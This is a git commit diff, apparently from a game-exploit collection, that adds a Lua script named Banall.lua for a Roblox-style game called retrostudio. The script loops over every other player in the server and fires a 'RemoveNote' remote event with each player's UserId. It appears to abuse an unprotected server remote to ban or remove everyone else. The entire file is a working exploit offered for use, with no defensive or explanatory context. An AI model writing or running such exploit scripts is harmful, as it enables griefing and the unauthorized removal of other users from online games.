f279a8af67d9d2cbaf3626401afc899608b32d7d
Anonymous <>
2025-02-14 14:12:04 +0900

    lo

---
+++ retrostudio/Notes/Banall.lua
@@ -0,0 +1,9 @@
+local Network = game:GetService("Lighting"):WaitForChild("Network")
+local GP = game:GetService("Players")
+
+for _, v in GP:GetPlayers() do
+    if v == GP.LocalPlayer then continue end
+    Network:WaitForChild("RemoveNote"):FireServer(unpack({
+        [1] = {[1] = v.UserId}
+    }))
+end
